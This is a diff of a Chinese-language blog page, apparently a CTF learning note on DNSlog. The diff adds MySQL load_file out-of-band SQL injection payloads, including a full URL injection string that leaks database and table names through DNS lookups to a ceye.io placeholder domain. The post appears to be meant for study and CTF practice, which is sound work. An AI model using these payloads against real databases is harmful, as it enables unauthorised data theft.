@@ -102,7 +102,7 @@
 <meta property="og:description" content="学习wp时遇到一个无回显的ping题目 需要用到dnslog 系统学习一下">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/rce1.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/rce2.PNG">
-<meta property="og:updated_time" content="2018-03-02T16:17:57.234Z">
+<meta property="og:updated_time" content="2018-03-05T14:38:24.862Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="dnslog利用">
 <meta name="twitter:description" content="学习wp时遇到一个无回显的ping题目 需要用到dnslog 系统学习一下">
@@ -409,7 +409,10 @@
 <p>这种行为很容易被目标物理防火墙认定位是黑客行为 最终导致IP被ban</p>
 <p>如果利用dnsLog来获取信息，既高效又避免这种情况发生</p>
 <p>mysql中load_file()函数可以用来发送dns解析请求</p>
-<p>利用payload: load_file(concat(‘\\\\‘,(select database()),’.domain.ceye.io’))</p>
+<p>利用payload: load_file(concat(‘\\‘,(select database()),’.domain.ceye.io\a.txt’))</p>
+<p>例如<br>/?id=1’ and if(select load_file(concat(‘\\‘,(select table_name from information_schema.tables where table_schema=database() limit 0,1),’.domain.ceye.io\a.txt’))),1,1) –+</p>
+<p>后来我才知道用dnslog辅助盲注的方法就是17hctf第二个web里说的oob (Out-of-Band 攻击)</p>
+<p>不过那道题还要加上 sql server 的 openquery 函数</p>
 <h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://skysec.top/2017/12/29/Time-Based-RCE/" target="_blank" rel="external">http://skysec.top/2017/12/29/Time-Based-RCE/</a><br><a href="http://www.mottoin.com/93274.html" target="_blank" rel="external">http://www.mottoin.com/93274.html</a><br><a href="https://bbs.ichunqiu.com/thread-22002-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-22002-1-1.html</a></p>
 
       
